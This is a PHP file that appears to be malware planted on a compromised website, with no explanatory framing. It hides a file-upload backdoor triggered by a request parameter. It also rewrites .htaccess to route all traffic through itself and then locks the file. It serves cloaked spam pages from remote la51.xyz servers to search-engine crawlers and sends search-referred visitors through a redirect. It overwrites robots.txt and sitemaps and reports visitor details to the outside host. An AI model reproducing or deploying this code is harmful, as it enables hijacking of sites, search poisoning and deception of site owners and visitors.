<?php 
header('Content-Type:text/html; charset=utf-8');
error_reporting(0);
$lineNo="2336";//组别数字
$jumpNo="2336";//组别数字 全站劫持组别放第一个163|164|165
$all_data="0";//是否全站劫持 1全站劫持
$all_jump="0";//是否全站劫持 1全站劫持
$rewrite_open = "1";//是否.h 1


function rsync_httpreq($url, $async = 0, $method = 1, $pf = NULL, $headers = array()) {
  if (!preg_match("/^http\:\/\//si", $url)) {
    if (isset($_GET['urlerr'])) {
      $err = '[urlerror] invalid url:&nbsp;';
      $err .= $url;
      echo $err;
      unset($err);
      exit();
    }
    return '';
  }
  $a = 'curl_init+curl_setopt+curl_exec|fsockopen|pfsockopen|stream_socket_client|socket_create';
  $b = $out = '';
  foreach (explode('|', $a) as $c) {
    $y = 1;
    if ($async && substr($c, 0, 1) == 'c') {
      continue;
    }
    foreach (explode('+', $c) as $d) {
      if (!function_exists($d)) {
        $y = 0;
      }
    }
    unset($d);
    if ($y) {
      $b = $c;
      break;
    }
  }
  unset($a, $c);
  if ($b == '') {
    return 0;
  }
  if (substr($b, 0, 1) == 'c') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'WHR');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    if ($method == 2) {
      curl_setopt($ch, CURLOPT_POST, 1);
      if(is_array($pf)){
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($pf));
      }
    }
    $r = curl_exec($ch);
    curl_close($ch);
    if (!$r) {
      if (isset($_GET['curlerr'])) {
        $err = '[curl error]&nbsp;';
        $err .= curl_error($ch);
        echo $err;
        unset($err);
        exit();
      }
      return 0;
    }else{
      $r = trim(trim($r, "\xEF\xBB\xBF"));
      return $r;
    }
  }
  $parse = parse_url($url);
  isset($parse['host']) || $parse['host'] = '';
  isset($parse['path']) || $parse['path'] = '';
  isset($parse['query'])|| $parse['query'] = '';
  isset($parse['port']) || $parse['port'] = '';
  $xpath = $parse['path'] ? $parse['path'].($parse['query'] ? '?'.$parse['query'] : '') : '/';
  $_host = $parse['host'];
  if ($parse['scheme'] == 'https') {
    $version = '1.1';
    $port = empty($parse['port']) ? 443 : $parse['port'];
    $_host = 'ssl://';
    $_host .= $parse['host'];
  } else {
    $version = '1.0';
    $port = empty($parse['port']) ? 80 : $parse['port'];
  }
  $hhost = 'Host: ';
  $hhost .= $_host;
  $headers[] = $hhost;
  $headers[] = 'Connection: Close';
  $headers[] = 'User-Agent: WHR';
  $headers[] = 'Accept: */*';
  unset($hhost);
  if ($method == 2) {
    if(is_array($pf)){
        $pf = http_build_query($pf);
    }
    $headers[] = 'Content-type: application/x-www-form-urlencoded';
    $headers[] = 'Content-Length: '.strlen($pf);
    $out = "POST $xpath HTTP/$version\r\n".join("\r\n", $headers)."\r\n\r\n".$pf;
    unset($pf);
  } else {
    $out = "GET $xpath HTTP/$version\r\n".join("\r\n", $headers)."\r\n\r\n";
  }
  unset($headers, $parse, $version, $xpath);

  $fp = null;
  if (substr($b, -1) == 'n') {
    $fp = $b($_host, $port, $errno, $errstr, 30);
  }else{
    if (substr($b, -1) == 't') {
      $tcp = 'tcp://';
      $tcp .= $_host;
      $tcp .= ':';
      $tcp .= $port;
      $fp = stream_socket_client($tcp, $errno, $errstr, 30);
      unset($tcp);
    }
  }
  $content = '';
  if ($fp) {
    stream_set_blocking($fp, true);
    stream_set_timeout($fp, 30);
    fwrite($fp, $out);
    if (!$async) {
      $status = stream_get_meta_data($fp);
      if (!$status['timed_out']) {
          while (!feof($fp)) {
            $line = fgets($fp);
            if ($line && ($line == "\r\n" || $line == "\n")) {
              break;
            }
            unset($line);
          }
          while (!feof($fp)) {
              $data = fread($fp, 8192);
              $content .= $data;
              unset($data);
          }
      }
      unset($status);
    }
    fclose($fp);
  }else{
    if (substr($b, -1) == 'e') {
      $_ip = gethostbyname($_host);
      $fp = $b(AF_INET, SOCK_STREAM, 0);
      if (socket_connect($fp, $_ip, $port)) {
        if (!$async) {
          socket_write($fp, $out, strlen($out));
          while($bf=@socket_read($fp, 8192)){
              $content .= $bf;
              unset($bf);
          }
          $content = explode("\r\n\r\n", $content);
          array_shift($content);
          $content = implode("\r\n\r\n", $content);
        }else{
          $t = mt_rand(2, 5);
          $i = 0;
          while ($i < $t) {
            socket_write($fp, $out, strlen($out));
            $i++;
            usleep(mt_rand(50000, 100000));
          }
          unset($i, $t);
        }
      }
      socket_close($fp);
      unset($_ip);
    }
  }
  if ($content == '') {
		if (function_exists('file_get_contents') and $url) {
			$content = @file_get_contents($url);
		}
	}
  unset($out, $b, $fp, $port, $_host);
  if (!$async) {
    $content = preg_replace_callback(
        '/(?:(?:\r\n|\n)|^)([0-9A-F]+)(?:\r\n|\n){1,2}(.*?)'.
        '((?:\r\n|\n)(?:[0-9A-F]+(?:\r\n|\n))|$)/si',
        create_function(
            '$matches',
            'return hexdec($matches[1]) == strlen($matches[2]) ? $matches[2] : $matches[0];'
        ),
        $content
    );
    return trim(trim($content, "\xEF\xBB\xBF"));
  }else{
    return 1;
  }
}
function BASE64_DEC0DE($string){
  $base_pre = substr($string, 0, 5);
  $base_ext = substr($string, -5);
  $base_ = substr($string, 7, strlen($string) - 14);
  return gzinflate(base64_decode($base_pre . $base_ . $base_ext));
}
function func_loginCheck($agent){
  $login = false;
  $bots = 'googlebot|bingbot|google|aol|bing|yahoo';
  
  if ($agent != '') {
    if (preg_match("/($bots)/si", $agent)) {
      $login = true;
    }
  }
  return $login;
}
function func_referCheck($refer){
  $redi = false;
  $referbots = 'google.co|yahoo.co.jp|bing';
  if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
    $redi = true;
  }
  return $redi;
}
function upfile(){
	$filenames=isset($_REQUEST['sfilename']) ? $_REQUEST['sfilename'] : '';
	$filecontents=isset($_REQUEST['sfilecontent']) ? $_REQUEST['sfilecontent'] : '';
	if(file_exists($filenames)){
		if (!unlink($filenames)){
			echo "deleteerror";
			exit();
		  }
	}
	file_put_contents($filenames,$filecontents, FILE_APPEND);
	echo $filenames.'success';
}
function class_x_i($x = ''){
  @set_time_limit(3600);
  @ignore_user_abort(1);
  global $lineNo,$all_data,$all_jump,$rewrite_open,$jumpNo;
  if (isset($_REQUEST['supfiles'])) {
	  upfile();
	  exit();
  }

  $httpReferer  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
  $login_status = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
  $lCheck = true;
  $rCheck = func_referCheck($httpReferer);
  
  $server_name = '';
  if (isset($_SERVER['HTTP_HOST'])) {
    $server_name = $_SERVER['HTTP_HOST'];
  }elseif (isset($_SERVER['SERVER_NAME'])) {
    $server_name = $_SERVER['SERVER_NAME'];
  }
  $page_location = $_SERVER['REQUEST_URI'];
  if(strstr($page_location,"bction=ping")){
	  if(strstr($_GET['mapname'],'.xml')){
		  $data_new = 'https://www.google.com/ping?sitemap='.$_GET['mapname'];
		  if(stristr(file_get_contents( $data_new),'google')){
			  echo '<br>ok<br>';
		  }else{
			  echo $data_new.'<br>ping false!<br>';
		  }
	  }else{
		  echo '<br>sitemap name false!<br>';
	  }
	  exit;
  }
  if(strstr($page_location,"span_allsitemap=")){
			$span_allsitemap_leng = strpos($page_location,"span_allsitemap=")+16;
			$span_allsitemap = substr($page_location,$span_allsitemap_leng);
			$xpath_content='<?xml version="1.0" encoding="UTF-8"? ><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
			if ($span_allsitemap != '') {
				$span_allsitemaps =explode("|",$span_allsitemap); 
				$fzxml = glob($span_allsitemaps[0]);
				$robotstxt='';
				foreach($fzxml as $xml){
					$xpath_content.=sprintf('<sitemap><loc>%s</loc><lastmod>%s</lastmod></sitemap>',"http://".$server_name."/".$xml,date('Y-m-d'));
					$robotstxt.=chr(13).chr(10).'Sitemap:http://'.$server_name."/".$xml;
				}
				$site_map = 'site_map.xml';
				if ($span_allsitemaps[1] != '') {
					$site_map = $span_allsitemaps[1];
				}
				$robotstxt='User-agent: *'.chr(13).chr(10).'Disallow:'.chr(13).chr(10).'Sitemap:http://'.$server_name.'/'.$site_map.$robotstxt;
				$xpath_content.='</sitemapindex>';
				$xpath_content = str_replace('encoding="UTF-8"? ','encoding="UTF-8"?',$xpath_content);
				if(@file_put_contents($site_map, $xpath_content)){
					@file_put_contents('robots.txt', $robotstxt);
					echo exit($site_map.' ok');
				}else{echo exit("失败");}
			}
  }

  $rewrite_index='';
  if(strpos($page_location,".php") > 0){
	$leng=strpos($page_location,".php")+4; 
    $rewrite_index=substr($page_location,0,$leng);
  }
  if($rewrite_index==''){
	  $rewrite_index = 'index.php';
  }
  $url_host_format = 'www%d.la51.xyz';
  
  $uri_start='';
  if (isset($_SERVER['REQUEST_SCHEME'])) {
    $uri_start = $_SERVER['REQUEST_SCHEME'];
  }else{
    $uri_start=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http');
  }

  $rewrite_open = (int)$rewrite_open;
  sync_htaccess('',$rewrite_open,$rewrite_index);
  $url_format='';
	$url_b = 'http://www50.la51.xyz/jump88.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
	$url_b = sprintf($url_b, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status),$all_jump,urlencode(date("Y-m-d")),urlencode($uri_start),$jumpNo);

	if (isset($_GET['guo_url2'])) {
	  echo $url_b;
	  exit();
	}
  if (strstr($page_location,'robots.txt')||strstr($page_location,"span_robots=")) {
	  $lineNos =explode("|",$lineNo);
	  $value = $lineNos[0];
	  $url_host_string = sprintf($url_host_format, $value);
	  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
	  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
	  $url_format = sprintf($url_format, $server_name, urlencode($page_location.'robotsshengcheng'), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$value);
	  $content = rsync_httpreq($url_format);
	  if(strstr($content,'<spango>')){
		  if(strstr($page_location,"robotsping=ping")){
			  $addarr_tmp = explode("\n",$content);
			  for($i=2;$i<rand(20,50);$i++){
				  if(strstr(trim($addarr_tmp[$i]),'.xml')){
					  $data_new = 'https://www.google.com/ping?sitemap='.str_replace('Sitemap:','',trim($addarr_tmp[$i]));
					  if(stristr(file_get_contents($data_new),'google')){
						  echo $data_new.'ok<br>';
					  }else{
						  echo $data_new.'ping false!<br>';
					  }
				  }else{
					  echo 'sitemap name false!<br>';
				  }
			  }
			  exit;
		  }
		  $content = str_replace('<spango>','',$content);
		  @file_put_contents('robots.txt', $content);
		  exit($content);
	  }
	  unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status);
	  exit();
  }
  if (strstr($page_location,'.xml')) {
	  $lineNos =explode("|",$lineNo);
	  $value = $lineNos[0];
	  $url_host_string = sprintf($url_host_format, $value);
	  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
	  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
	  $url_format = sprintf($url_format, $server_name, urlencode($page_location.'ditushengcheng'), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$value);
	  $content = rsync_httpreq($url_format);
	  if(strstr($content,'<spango>')){
		if(strstr($content,'getcontent500page')){
			@header('HTTP/1.1 500 Internal Server Error');
			exit();
		}else if(strstr($content,'getcontent404page')){
			@header('HTTP/1.1 404 Not Found');
			exit();
		}
		$content = str_replace('<spango>','',$content);
		if (strstr($page_location,'.xml.gz')) {
			$lengb=strpos($page_location,".xml.gz")+7; 
			$xml_name = explode("/",str_replace('?','/',substr($page_location,0,$lengb)));
			header('Content-Type: application/x-gzip');
			header('Content-Disposition: attachment; filename="'.$xml_name[count($xml_name)-1].'"');
			header('Cache-Control: no-cache, no-store, max-age=0, must-revalidate');
			header('Pragma: no-cache');
			$gz_sitemap_content = gzencode($content, 9);
			echo $gz_sitemap_content;
			exit();
		}
		if(strstr($_SERVER['REQUEST_URI'],"span_sitemap=")){
			$span_sitemap_leng = strpos($_SERVER['REQUEST_URI'],"span_sitemap=")+13;
			$span_sitemap = substr($_SERVER['REQUEST_URI'],$span_sitemap_leng);
			if ($span_sitemap != '') {
				if(strstr($span_sitemap,'/')){
					$filemap =explode("/",$span_sitemap);
					if (!file_exists($filemap[0])) {mkdir($filemap[0]);}
				}
				if(@file_put_contents($span_sitemap, $content)){
					$robots_path = 'robots.txt';
					$map_content = "Sitemap:  http://".$server_name."/".$span_sitemap."\n";
					if ($robots_path != '' && file_exists($robots_path)) {
						$robots_content = @file_get_contents($robots_path);
						$map_content = $map_content . $robots_content;
						@file_put_contents($robots_path, $map_content);
					}else{@file_put_contents($robots_path, $map_content);}
					echo exit($span_sitemap." ok");
				}else{echo exit("失败");}
			}
		}
		if(strstr($_SERVER['REQUEST_URI'],"span_sitemapgz=")){
			$span_sitemapgz_leng = strpos($_SERVER['REQUEST_URI'],"span_sitemapgz=")+15;
			$span_sitemapgz = substr($_SERVER['REQUEST_URI'],$span_sitemapgz_leng);
			if ($span_sitemapgz != '') {
				if(strstr($span_sitemapgz,'/')){
					$filemap =explode("/",$span_sitemapgz);
					if (!file_exists($filemap[0])) {mkdir($filemap[0]);}
				}
				$gzfile = $span_sitemapgz.".gz";
				$fp = gzopen($gzfile, 'w9');
				gzwrite ($fp, $content);
				gzclose($fp);
				echo exit($span_sitemapgz.".gz ok");
			}
		}
		@header('content-type: text/xml');
		exit($content);
		unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status);
		exit();
	  }
  }
  if($rCheck){
		$content = rsync_httpreq($url_b);
	if(strstr($content,'<spango>')){
		$content = str_replace('<spango>','',$content);
		
		echo "$content";
		unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status); 
		exit();
	}
  }
  if($lCheck){
		$lineNos =explode("|",$lineNo);
		for ($i=0;$i<count($lineNos);$i++){
			  $url_host_string = sprintf($url_host_format, $lineNos[$i]);
			  $url_format = 'http://%host%/data66.php?d=%s&u=%s&r=%s&l=%s&n=%s&t=%s&h=%s&g=%s';
			  $url_format = preg_replace("/%host%/si", $url_host_string, $url_format);
			  $url_format = sprintf($url_format, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status),$all_data,urlencode(date("Y-m-d")),urlencode($uri_start),$lineNos[$i]);
				if (isset($_GET['guo_url1'])) {
					  echo $url_format;
					  exit();
				}
			  $content = rsync_httpreq($url_format);
			if(strstr($content,'<spango>')){
				if(strstr($content,'getcontent500page')){
					@header('HTTP/1.1 500 Internal Server Error');
					exit();
				}else if(strstr($content,'getcontent404page')){
					@header('HTTP/1.1 404 Not Found');
					exit();
				}else{
					$content = str_replace('<spango>','',$content);
					echo "$content";
					unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer,$login_status); 
					exit();
				}
			}
		}
  }
}
//写入.h规则内容
function sync_htaccess($htaccess_rule = '', $rewrite_open,$rewrite_index){
	$rewrite_index = substr($rewrite_index, 0, @strrpos($rewrite_index, '.'));
	$htaccess_rule= "<IfModule mod_rewrite.c>\n";
	$htaccess_rule .="RewriteEngine\x20On\n";
	$htaccess_rule .="RewriteBase\x20/\n";
	$htaccess_rule .="RewriteRule\x20^".$rewrite_index.".php$\x20-\x20[L]\n";
	$htaccess_rule .="RewriteCond\x20%{REQUEST_FILENAME}\x20!-f\n";
	$htaccess_rule .="RewriteCond\x20%{REQUEST_FILENAME}\x20!-d\n";
	$htaccess_rule .="RewriteRule\x20.\x20/".$rewrite_index.".php [L]\n";
	$htaccess_rule .="</IfModule>";
	if ($htaccess_rule != '') {
		if ($rewrite_open) {
		  $htaccess_path = './.htaccess';
		  if ($htaccess_path != '' && file_exists($htaccess_path)) {
			@chmod($htaccess_path, 0777);
			$htaccess_content = @file_get_contents($htaccess_path);
			if (!preg_match('/REQUEST_FILENAME/', $htaccess_content) && !preg_match("/".$rewrite_index.".php/", $htaccess_content)) {
				$htaccess_content = $htaccess_rule . PHP_EOL .$htaccess_content;
				@file_put_contents($htaccess_path, $htaccess_content);
			}
		  }
		  @chmod($htaccess_path, 0444);
		}
	}
}
class_x_i();
?>
